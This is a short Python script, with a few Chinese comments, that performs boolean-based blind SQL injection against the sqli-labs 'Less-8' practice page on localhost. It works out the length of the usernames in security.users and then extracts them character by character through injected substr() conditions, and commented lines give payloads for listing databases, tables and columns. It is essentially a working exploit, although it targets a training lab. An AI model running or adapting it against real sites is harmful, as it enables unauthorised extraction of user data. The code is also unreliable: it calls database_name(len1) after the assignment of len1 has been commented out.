import requests
import time
def database_len():
	for i in range(1,1000):
		url = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''
		payload = '''?id=1' and  length((select group_concat(username) from security.users)) >%d''' %i
		# print(url+payload+'%23')
		r = requests.get(url+payload+'%23')
		
		if 'You are in' in r.text:
			print(i)
 
		else:
			#print('false')
			fp=open('a1.html','w+')
			fp.write(r.text)
			print('database_length:',i)
			return i
			break

#len1=database_len()   
 
def database_name(len1):
	z="sqcwertyuioplkjhgfdazxvbnm"
	print( len(z))
	name = ''
	for j in range(1,len1+1):#字符串匹配的长度范围
		for i in range(1,257):#字符串匹配的范围
			url = "http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr((select group_concat(username) from security.users),%d,1)='%s'" %(j,chr(i))
			# print(url+'%23')
			r = requests.get(url+'%23')
			if 'You are in' in r.text:
				name = name+chr(i)
				
				print(name)

				break
	print('database_name:',name.lower())	
database_name(len1)
 #url可以改
 #(select database())
 #select group_concat(table_name) from information_schema.tables where table_schema='security'
 #(select group_concat(column_name) from information_schema.columns where table_name='users') 
 #(select group_concat(username) from security.users)
 #
